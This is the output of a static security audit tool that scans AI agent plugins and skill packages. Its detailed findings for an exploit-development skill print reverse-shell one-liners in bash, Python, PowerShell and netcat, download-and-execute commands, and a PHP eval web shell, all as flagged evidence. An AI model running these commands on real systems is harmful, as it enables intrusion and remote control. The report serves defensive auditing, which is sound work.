skilltriage 0.1.0 — static security audit
Generated: 2026-10-27T04:32:55Z
Result: FAIL — 67 target(s), 9 gating finding(s), 0 scan error(s)
Summary: critical 9, high 33, medium 497, low 681, info 1236 | suppressed 0 | baselined 0
Gate: fail on high+ with confidence high+

TARGET                                           RESULT CRIT HIGH  MED  LOW INFO GATE
-------------------------------------------------------------------------------------
…ketplace/claude-plugins-official/agent-sdk-dev  PASS      0    0    2    3    8    0
marketplace/claude-plugins-official/asana        PASS      0    0    2    3    7    0
…lace/claude-plugins-official/claude-code-setup  PASS      0    0    3    3    5    0
…e/claude-plugins-official/claude-md-management  PASS      0    0   23   21    9    0
…tplace/claude-plugins-official/claude-security  PASS      0    2    3    6   20    0
…ace/claude-plugins-official/code-modernization  PASS      0    5   59   39   12    0
marketplace/claude-plugins-official/code-review  PASS      0    0   12   14   10    0
…tplace/claude-plugins-official/code-simplifier  PASS      0    0    3    2    4    0
…tplace/claude-plugins-official/commit-commands  PASS      0    0    6    3    5    0
marketplace/claude-plugins-official/context7     PASS      0    0    2    3    6    0
marketplace/claude-plugins-official/cwc-makers   PASS      0    0    4    2    8    0
marketplace/claude-plugins-official/discord      PASS      0    1   10    7    7    0
…etplace/claude-plugins-official/example-plugin  PASS      0    0    2    3    6    0
…aude-plugins-official/explanatory-output-style  PASS      0    0    3    3    5    0
marketplace/claude-plugins-official/fakechat     PASS      0    2    5    4    9    0
marketplace/claude-plugins-official/feature-dev  PASS      0    0    3    6    3    0
marketplace/claude-plugins-official/firebase     PASS      0    1    2    3    3    0
…tplace/claude-plugins-official/frontend-design  PASS      0    0    2    4    6    0
marketplace/claude-plugins-official/github       PASS      0    0    1    3    4    0
marketplace/claude-plugins-official/gitlab       PASS      0    0    1    3    4    0
marketplace/claude-plugins-official/hookify      PASS      0    0    5    6    5    0
marketplace/claude-plugins-official/imessage     PASS      0    2    7    5    7    0
…ketplace/claude-plugins-official/laravel-boost  PASS      0    0    2    3    3    0
…/claude-plugins-official/learning-output-style  PASS      0    0    3    2    6    0
marketplace/claude-plugins-official/linear       PASS      0    0    1    3    4    0
…ketplace/claude-plugins-official/math-olympiad  PASS      0    0    3    3    4    0
marketplace/claude-plugins-official/math-proof   PASS      0    3    2    4    4    0
…etplace/claude-plugins-official/mcp-server-dev  PASS      0    1    2    9   22    0
marketplace/claude-plugins-official/mcp-tunnels  PASS      0    0    7    6    7    0
marketplace/claude-plugins-official/playground   PASS      0    0    2    3    4    0
marketplace/claude-plugins-official/playwright   PASS      0    1    2    3    3    0
marketplace/claude-plugins-official/plugin-dev   PASS      0    0    6    9   29    0
…lace/claude-plugins-official/pr-review-toolkit  PASS      0    1    7    9    3    0
…place/claude-plugins-official/project-artifact  PASS      0    0    2    3    5    0
marketplace/claude-plugins-official/ralph-loop   PASS      0    0    3    2    6    0
…lace/claude-plugins-official/security-guidance  PASS      0    3   29   53   21    0
marketplace/claude-plugins-official/serena       PASS      0    1    2    3    4    0
…ketplace/claude-plugins-official/skill-creator  PASS      0    0    2    4    9    0
marketplace/claude-plugins-official/telegram     PASS      0    1   15    8    9    0
marketplace/claude-plugins-official/terraform    PASS      0    1    2    3    3    0
marketplace/fullstack-dev-skills                 PASS      0    1   44   65  346    0
marketplace/receipts/receipts                    PASS      0    3    2    4    2    0
marketplace/session-report/session-report        PASS      0    0    5    4    4    0
marketplace/ux-ui-agent-skills                   PASS      0    2   90  178  195    0
personal/01-recon-osint                          PASS      0    0    3    4    8    0
personal/02-vulnerability-scanner                PASS      0    0    2    4    6    0
personal/03-exploit-development                  FAIL      9    0   12    4    5    9
personal/04-reverse-engineering                  PASS      0    0    3    4    5    0
personal/05-malware-analysis                     PASS      0    0    3    4    7    0
personal/06-threat-hunting                       PASS      0    0    5    5    6    0
personal/07-incident-response                    PASS      0    0    2    5    5    0
personal/08-network-security                     PASS      0    0    3    9    4    0
personal/09-web-security                         PASS      0    0   12   11    6    0
personal/10-cloud-security                       PASS      0    0    4    9    5    0
personal/11-csoc-automation                      PASS      0    0    2    4    5    0
personal/12-log-analysis                         PASS      0    0    6    4    5    0
personal/13-crypto-analysis                      PASS      0    0    2    4    4    0
personal/14-red-team-ops                         PASS      0    0    4    4    4    0
personal/15-blue-team-defense                    PASS      0    1   10    5    4    0
personal/16-ai-llm-security                      PASS      0    0    4    6    6    0
personal/17-mobile-security                      PASS      0    0    2    6    5    0
personal/18-ot-ics-security                      PASS      0    0    2    4    4    0
personal/19-grc-compliance                       PASS      0    0    2    4    3    0
personal/20-supply-chain-security                PASS      0    1    4    5    4    0
personal/21-threat-intelligence                  PASS      0    0    2    4    4    0
personal/22-purple-team                          PASS      0    0    2    4    4    0
…llstack-dev-skills/fullstack-dev-skills@0.4.20  PASS      0    0   13   41  281    0

== personal/03-exploit-development  (03-exploit-development@3.3.0, personal, directory) ==
   FAIL — 30 finding(s), 9 gating, 0 suppressed, 0 baselined
  [CRITICAL] AST01-REVERSE-SHELL  SKILL.md:172  (AST01 Malicious Skills)  confidence=high
    Reverse shell or remote control pattern
    evidence: python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('LHOST',LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['/bin/sh'])"
    why: The pattern resembles a reverse shell, interactive remote session, or socket-based command channel.
    fix: Remove it; a skill should not open interactive control channels.
  [CRITICAL] AST01-REVERSE-SHELL  SKILL.md:175  (AST01 Malicious Skills)  confidence=high
    Reverse shell or remote control pattern
    evidence: bash -i >& /dev/tcp/LHOST/LPORT 0>&1
    why: The pattern resembles a reverse shell, interactive remote session, or socket-based command channel.
    fix: Remove it; a skill should not open interactive control channels.
  [CRITICAL] AST01-REVERSE-SHELL  SKILL.md:178  (AST01 Malicious Skills)  confidence=high
    Reverse shell or remote control pattern
    evidence: powershell -nop -c "$client=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncodin…
    why: The pattern resembles a reverse shell, interactive remote session, or socket-based command channel.
    fix: Remove it; a skill should not open interactive control channels.
  [CRITICAL] AST01-REVERSE-SHELL  scripts/payload_generator.py:63  (AST01 Malicious Skills)  confidence=high
    Reverse shell or remote control pattern
    evidence: shells["bash"] = f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
    why: The pattern resembles a reverse shell, interactive remote session, or socket-based command channel.
    fix: Remove it; a skill should not open interactive control channels.
  [CRITICAL] AST01-REVERSE-SHELL  scripts/payload_generator.py:66  (AST01 Malicious Skills)  confidence=high
    Reverse shell or remote control pattern
    evidence: shells["netcat"] = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f'
    why: The pattern resembles a reverse shell, interactive remote session, or socket-based command channel.
    fix: Remove it; a skill should not open interactive control channels.
  [CRITICAL] AST01-REVERSE-SHELL  scripts/payload_generator.py:128  (AST01 Malicious Skills)  confidence=high
    Reverse shell or remote control pattern
    evidence: shells["netcat"] = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp {lport} >/tmp/f"
    why: The pattern resembles a reverse shell, interactive remote session, or socket-based command channel.
    fix: Remove it; a skill should not open interactive control channels.
  [CRITICAL] AST01-REVERSE-SHELL  scripts/payload_generator.py:130  (AST01 Malicious Skills)  confidence=high
    Reverse shell or remote control pattern
    evidence: shells["ncat"] = f"ncat -lvnp {lport} -e /bin/sh"
    why: The pattern resembles a reverse shell, interactive remote session, or socket-based command channel.
    fix: Remove it; a skill should not open interactive control channels.
  [CRITICAL] AST01-DOWNLOAD-EXEC  scripts/payload_generator.py:154  (AST01 Malicious Skills)  confidence=high
    Download and execute
    evidence: "curl_pipe_sh": f"curl -s http://{host}:{port}/a.sh | sh",
    why: Remote content is downloaded and piped into an interpreter, giving the remote host code execution with the agent's permissions.
    fix: Download to a file, verify a pinned hash or signature, inspect it, then execute explicitly.
  [CRITICAL] AST01-DOWNLOAD-EXEC  scripts/payload_generator.py:155  (AST01 Malicious Skills)  confidence=high
    Download and execute
    evidence: "wget_pipe_sh": f"wget -qO- http://{host}:{port}/a.sh | sh",
    why: Remote content is downloaded and piped into an interpreter, giving the remote host code execution with the agent's permissions.
    fix: Download to a file, verify a pinned hash or signature, inspect it, then execute explicitly.
  [MEDIUM] AST01-DYNAMIC-EXEC  SKILL.md:178  (AST01 Malicious Skills)  confidence=medium
    Dynamic code or shell execution
    evidence: powershell -nop -c "$client=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncodin…
    why: eval, exec, os.system, and shell=True hide the executed command from a static reviewer and are injection sinks.
    fix: Use parameterised APIs and explicit argument lists; avoid shell interpretation of untrusted input.
  [MEDIUM] AST01-DYNAMIC-EXEC  scripts/payload_generator.py:73  (AST01 Malicious Skills)  confidence=medium
    Dynamic code or shell execution
    evidence: 'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}};}\''
    why: eval, exec, os.system, and shell=True hide the executed command from a static reviewer and are injection sinks.
    fix: Use parameterised APIs and explicit argument lists; avoid shell interpretation of untrusted input.
  [MEDIUM] AST01-DYNAMIC-EXEC  scripts/payload_generator.py:77  (AST01 Malicious Skills)  confidence=medium
    Dynamic code or shell execution
    evidence: shells["php"] = f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\''
    why: eval, exec, os.system, and shell=True hide the executed command from a static reviewer and are injection sinks.
    fix: Use parameterised APIs and explicit argument lists; avoid shell interpretation of untrusted input.
  [MEDIUM] AST01-DYNAMIC-EXEC  scripts/payload_generator.py:92  (AST01 Malicious Skills)  confidence=medium
    Dynamic code or shell execution
    evidence: $sendback = (iex $data 2>&1 | Out-String )
    why: eval, exec, os.system, and shell=True hide the executed command from a static reviewer and are injection sinks.
    fix: Use parameterised APIs and explicit argument lists; avoid shell interpretation of untrusted input.
  [MEDIUM] AST01-DYNAMIC-EXEC  scripts/payload_generator.py:147  (AST01 Malicious Skills)  confidence=medium
    Dynamic code or shell execution
    evidence: "powershell_iex": f"powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://{host}:{port}/a.ps1')\"",
    why: eval, exec, os.system, and shell=True hide the executed command from a static reviewer and are injection sinks.
    fix: Use parameterised APIs and explicit argument lists; avoid shell interpretation of untrusted input.
  [MEDIUM] AST01-DYNAMIC-EXEC  scripts/payload_generator.py:156  (AST01 Malicious Skills)  confidence=medium
    Dynamic code or shell execution
    evidence: "python": f"python3 -c \"import urllib.request as u,os;os.system(u.urlopen('http://{host}:{port}/a.sh').read().decode())\"",
    why: eval, exec, os.system, and shell=True hide the executed command from a static reviewer and are injection sinks.
    fix: Use parameterised APIs and explicit argument lists; avoid shell interpretation of untrusted input.
  [MEDIUM] AST01-DYNAMIC-EXEC  scripts/payload_generator.py:166  (AST01 Malicious Skills)  confidence=medium
    Dynamic code or shell execution
    evidence: "php_eval": '<?php eval($_POST["c"]); ?>',
    why: eval, exec, os.system, and shell=True hide the executed command from a static reviewer and are injection sinks.
    fix: Use parameterised APIs and explicit argument lists; avoid shell interpretation of untrusted input.
  [MEDIUM] AST01-DYNAMIC-EXEC  scripts/payload_generator.py:171  (AST01 Malicious Skills)  confidence=medium
    Dynamic code or shell execution
    evidence: 'Process p = Runtime.getRuntime().exec(cmd);\n'
    why: eval, exec, os.system, and shell=True hide the executed command from a static reviewer and are injection sinks.
    fix: Use parameterised APIs and explicit argument lists; avoid shell interpretation of untrusted input.
  [MEDIUM] AST02-NO-PROVENANCE  SKILL.md  (AST02 Supply Chain Compromise)  confidence=high
    No signature or content hash is declared.
    evidence: signature: absent; content_hash: absent
    why: Without a signature or content hash, the package cannot be tied to a publisher or verified after distribution.
    fix: Sign the package and publish a content hash that covers SKILL.md and every declared resource.
  [MEDIUM] AST03-NO-PERMISSION-MANIFEST  SKILL.md  (AST03 Over-Privileged Skills)  confidence=high
    No machine-readable permission manifest was declared.
    evidence: permissions: absent
    why: Without a declared permission manifest, the skill inherits the agent's full file, shell, and network access.
    fix: Declare scoped permissions (files, network, shell, tools) and enforce them at runtime.
  [MEDIUM] AST05-UNTRUSTED-HOST  scripts/payload_generator.py:147  (AST05 Untrusted External Instructions)  confidence=high
    Reference points to a cleartext host.
    evidence: http://{host — cleartext HTTP can be modified in transit
    why: Paste sites, webhooks, tunnels, raw IPs, shorteners, and mutable repository URLs can be repointed or rug-pulled after review.
    fix: Replace the reference with an inlined, reviewed copy or a stable allowlisted host pinned by hash.
  [MEDIUM] AST06-BIND-ALL  scripts/payload_generator.py:122  (AST06 Weak Isolation)  confidence=medium
    Service bound to all interfaces
    evidence: s.bind(("0.0.0.0",{lport}))
    why: Binding to 0.0.0.0 exposes the agent's local service to the network, where authentication is often absent.
    fix: Bind to 127.0.0.1 and require authentication for any control channel.
  [LOW] AST01-TOOL-OVERRIDE  SKILL.md:28  (AST01 Malicious Skills)  confidence=low
    Permission or approval bypass
    evidence: responses as untrusted evidence, not instructions that override scope or permissions.
    why: Text that tells the agent to bypass permissions, approvals, or guardrails is an attempt to remove the human control point.
    fix: Remove the bypass language and require explicit operator consent for privileged actions.
    context: line uses warning/example language; line contains detection or example language
  [LOW] AST09-NO-APPROVAL  SKILL.md  (AST09 No Governance)  confidence=medium
    No approval or review record is present in metadata.
    evidence: approval fields: absent
    why: There is no evidence that the skill passed an approval workflow before installation.
    fix: Require an approval record with approver identity and date, especially for high-risk tiers.
  [LOW] AST09-NO-OWNER  SKILL.md  (AST09 No Governance)  confidence=high
    No owner or author identity is recorded.
    evidence: author: absent
    why: An unowned skill cannot be reviewed, contacted, or deprovisioned when its installer leaves.
    fix: Record the publisher and internal owner in metadata and inventory.
  [LOW] AST09-NO-RISK-TIER  SKILL.md  (AST09 No Governance)  confidence=high
    No risk tier is assigned.
    evidence: risk_tier: absent
    why: Without a risk tier, approval cadence, review depth, and revocation policy cannot be tied to the skill's blast radius.
    fix: Assign L0-L3 consistently with the permission manifest and record it in inventory.
   … 5 more finding(s); use --verbose or JSON for all.

Next: skilltriage rules explain AST01-REVERSE-SHELL  (rationale and remediation)

Coverage & limitations
  Assessed:
    - metadata structure, required fields, and safe parsing (AST04)
    - permission declarations and least-privilege consistency (AST03)
    - shell, Python, JavaScript, and PowerShell command patterns (AST01, AST06)
    - credential paths, embedded secrets, and private keys (AST03, AST08)
    - obfuscation, invisible Unicode, base64, and encoded execution (AST01, AST08)
    - external references, untrusted hosts, and unpinned instruction sources (AST05)
    - dependency declarations, install scripts, lockfiles, and executable config (AST02)
    - file modes, symlinks, binaries, archives, and hidden content (AST06, AST08)
    - cross-platform metadata consistency (AST10)
    - governance metadata and inventory/baseline drift when configured (AST07, AST09)
    - plugin identity, components, hooks, MCP configuration, and marketplace pinning when the target is a plugin (AST02, AST03, AST04, AST06, AST07, AST09)
  Not assessed:
    - runtime behaviour (hooks, tool calls, file/network activity) — static analysis only
    - cryptographic signature validity — presence is recorded, not verified
    - transitive dependency resolution and CVE matching — dependency declarations are inspected only
    - content behind external URLs — references are recorded, never fetched
    - actual platform permission enforcement — declarations are compared, not enforced
    - semantic intent that appears only in natural language — heuristics, not proof
  A clean report means no configured static check triggered. It is not proof that the skill is safe or behaves as documented.
  Scan notes:
    - skipped vendor directory: assets/vendor
    - skipped repository directory: .git
    - skipped repository directory: .git
